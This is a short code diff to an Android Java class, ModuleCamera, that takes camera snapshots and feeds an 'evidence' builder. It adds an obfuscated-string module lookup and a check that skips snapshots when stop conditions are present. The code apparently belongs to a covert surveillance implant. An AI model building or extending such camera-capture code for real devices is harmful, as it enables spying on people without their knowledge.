@@ -21,9 +21,11 @@ import com.android.dvci.auto.Cfg;
 import com.android.dvci.conf.ConfModule;
 import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.evidence.EvidenceType;
+import com.android.dvci.manager.ManagerModule;
 import com.android.dvci.module.camera.CameraSnapshot;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.Utils;
+import com.android.mm.M;
 
 import java.io.IOException;
 import java.util.concurrent.Callable;
@@ -39,6 +41,10 @@ public class ModuleCamera extends BaseInstantModule {
 	private static final String TAG = "ModuleCamera"; //$NON-NLS-1$
 
 	int counter = 0;
+
+	public static ModuleCamera self() {
+		return (ModuleCamera) ManagerModule.self().get(M.e("camera"));
+	}
 
 
 	//private boolean face;
@@ -67,6 +73,12 @@ public class ModuleCamera extends BaseInstantModule {
 				}
 				return;
 			}*/
+			if(haveStops()){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (actualStart) don't Run we have stops:" + stopList.toString());
+				}
+				return;
+			}
 			if(CameraSnapshot.self().getCamera_killed() <= CameraSnapshot.MAX_CAMERA_KILLS) {
 				snapshot();
 			}
